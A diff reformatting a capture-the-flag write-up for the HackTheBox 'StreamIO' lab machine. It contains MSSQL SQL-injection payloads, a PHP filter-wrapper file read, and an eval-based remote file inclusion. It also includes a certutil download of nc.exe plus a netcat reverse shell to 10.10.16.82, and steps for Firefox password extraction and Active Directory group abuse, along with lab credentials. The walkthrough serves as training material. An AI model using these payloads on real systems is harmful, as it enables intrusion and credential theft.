@@ -77,12 +77,9 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Mon Sep  7 02:09:34 2026 -- 1 IP address (1 host up) scanned in 272.35 seconds
 ```
 
-- no ldap anonymous bind
-- no guest user on smb
+No anonymous LDAP bind and no guest user on smb.
 
-> `https://streamio.htb` -> holds a login page and about page
-- we need valid creds to login, and the about page revealed few usernames from the team:
-	- no NP users from the team username
+> `https://streamio.htb` -> holds a login page and about page. We need valid creds to login, and the about page revealed few usernames from the team:
 
 ```Team-users
 Barry
@@ -90,9 +87,9 @@ Oliver
 Samnatha
 ```
 
-- On `login.php` even registered users can't login
+No NP users from the team username. On `login.php` even registered users can't login.
 
-Scan exposed the subdomain of the web server domain:
+The scan exposed the subdomain of the web server domain:
 
 ```sh
 443/tcp   open  ssl/https?
@@ -102,14 +99,11 @@ Scan exposed the subdomain of the web server domain:
 
 > `https://watch.streamio.htb`
 
- - `search.php` -> discovered under the subdomain `watch`
- -> start with brute-forcing with **special characters** using `ffuf` on q parameter, filtering common output to find what sql it's using
+`search.php` was discovered under the subdomain `watch`. Start with brute-forcing with **special characters** using `ffuf` on q parameter, filtering common output to find what sql it's using.
 
 The mssql query can be executed in below formats in the backend.
 
-By manipulating the **q** parameter -> if you mention 500 it dumps movies which have **strings** with `500` in the html tag `<h5 class = "p-2">`
-
-`<h5 class = "p-2">` -> can be used to match whether the output executed and returns error (hope string)
+By manipulating the **q** parameter, if you mention 500 it dumps movies which have **strings** with `500` in the html tag `<h5 class = "p-2">`. That tag can be used to match whether the output executed and returns error (hope string).
 
 Tested with `500%' -- -` — it returns the hope string:
 
@@ -131,7 +125,7 @@ Now we can manipulate and upgrade the query with the structure:
 
 > note: We can use **xp_dirtree** and by setting up an **responder** we can find the **user** and **hash** of the **mssql server hoster**, but it returned **DC$** -> we didn't go for it because it often returns the hash **with a random string**
 
-- Got to know it uses **MSSQL server 2019 - 15.0.2000.5**
+Got to know it uses **MSSQL server 2019 - 15.0.2000.5**
 
 ```
 500' union select 1,(select db_name()),3,4,5,6-- -
@@ -143,8 +137,7 @@ We got the list of the databases
 500' union select 1,(SELECT STRING_AGG(name, ',') name FROM STREAMIO..sysobjects WHERE xtype='U'),3,4,5,6-- -
 ```
 
-- `STRING_AGG` -> used to list the tables using `,` 
-- `xtype= 'U'` -> used to dump only user defined tables
+`STRING_AGG` -> used to list the tables using `,`. `xtype= 'U'` -> used to dump only user defined tables.
 
 ```
 500' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -
@@ -157,17 +150,11 @@ We got the list of the databases
 > `yoshihide - 66boysandgirls..`
 
 # User
-We can login as **yoshihide** on `streamio.htb`:
-- Can access the `admin panel` 
+We can login as **yoshihide** on `streamio.htb` and can access the `admin panel`.
 
-`https://streamio.htb/admin/?message=` => The sub tabs change with the query
-- Brute-forced and got a directory -> **master.php**
-- Brute-forced the query to find any **hidden query parameter**
+`https://streamio.htb/admin/?message=` => The sub tabs change with the query. Brute-forced and got a directory -> **master.php**, then brute-forced the query to find any **hidden query parameter**.
 
-- Got **master.php** & **debug** query 
-
--> On the debug page we had no idea what to do with the parameter, but using index.php it reflects with an error
-- When we tried with master.php it dumped the page
+Got **master.php** & **debug** query. On the debug page we had no idea what to do with the parameter, but using index.php it reflects with an error. When we tried with master.php it dumped the page.
 
 ### PHP wrapper
 
@@ -177,9 +164,7 @@ We can login as **yoshihide** on `streamio.htb`:
 php://filter/convert.base64-encode/resource=<file>
 ```
 
-- Encodes the php page content and reflects it
-
-Since master.php isn't directly accessible, grab it using the php wrapper:
+Encodes the php page content and reflects it. Since master.php isn't directly accessible, grab it using the php wrapper:
 
 ```url
 https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
@@ -187,9 +172,7 @@ https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=ma
 
 Once grabbed, decode the base64 and we get the master.php source code.
 
-In the **master.php**:
-- **File Inclusion** can be performed using **file_get_contents** with variable name **include** with a **POST** verb request
-- `file_get_contents` is used by the **eval** function which makes execution possible  
+In the **master.php**, **File Inclusion** can be performed using **file_get_contents** with variable name **include** with a **POST** verb request. `file_get_contents` is used by the **eval** function which makes execution possible.
 
 ```php
 <form method="POST">
@@ -210,16 +193,15 @@ Alter the request method to **POST** and use the **include** parameter for **Rem
 
 > **Note** : Don't forget `Content-Type: application/x-www-form-urlencoded` and don't use empty space after include — remove any empty space
 
-- Set up a server and listener -> the php file will be executed from the server and connects to the listener
+Set up a server and listener — the php file will be executed from the server and connects to the listener.
 
-Payload:
-- 1st upload `nc.exe` executable to the system 
+Payload: first upload `nc.exe` executable to the system:
 
 ```php
 system("certutil -urlcache -f http://10.10.16.82:8000/nc.exe nc.exe");
 ```
 
-- execute the `nc.exe` to connect back to the listener
+Then execute the `nc.exe` to connect back to the listener:
 
 ```php
 system("nc.exe 10.10.16.82 9001 -e cmd");
@@ -232,8 +214,7 @@ In index.php we got the username and password for the **STREAMIO** database whic
 > `db_admin - B1@hx31234567890`
 
 ### sqlcmd
-`sqlcmd` can interact with the mssql server in powershell:
-- upgrade to powershell
+`sqlcmd` can interact with the mssql server in powershell — upgrade to powershell:
 
 ```powershell
 sqlcmd -S STREAMIO -U db_admin -P B1@hx31234567890
@@ -246,7 +227,7 @@ SELECT name FROM sys.databases;
 GO                       -- Go is used to execute the sql command
 ```
 
-- `streamio_backup` looks interesting
+`streamio_backup` looks interesting:
 
 ```sql
 use streamio_backup;
@@ -258,7 +239,7 @@ SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'
 GO
 ```
 
-- It also has a `users` table
+It also has a `users` table:
 
 ```sql
 select * from users;
@@ -280,7 +261,7 @@ C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile-folder>\.
 
 > **Local Encryption**: The passwords inside `logins.json` are encrypted locally and cannot be read as plain text without the matching `key4.db` file.
 
-- Download `logins.json` and `key4.db` from the directory
+Download `logins.json` and `key4.db` from the directory
 
 > https://github.com/lclevy/firepwd -> can be used to dump the password 
 
@@ -308,11 +289,9 @@ faketime "now -16 hours -56 minutes -08 seconds" bloodhound-python -u JDGODD -p 
 
 Executed without error (error should not be there while collecting)
 
-**JDGODD** got `WriteOwner` permission over the **CORE STAFF group**:
-- But JDGODD doesn't have a shell
+**JDGODD** got `WriteOwner` permission over the **CORE STAFF group**, but JDGODD doesn't have a shell.
 
-**net** can be used to execute system commands using smb server:
-- Used net to **add** JDGODD to the **CORE STAFF group**
+**net** can be used to execute system commands using smb server — used net to **add** JDGODD to the **CORE STAFF group**:
 
 ```sh
 net rpc group addmem "Core Staff" "JDGodd" -U "streamio.htb"/"JDgodd"%"JDg0dd1s@d0p3cr3@t0r" -S "dc.streamio.htb"
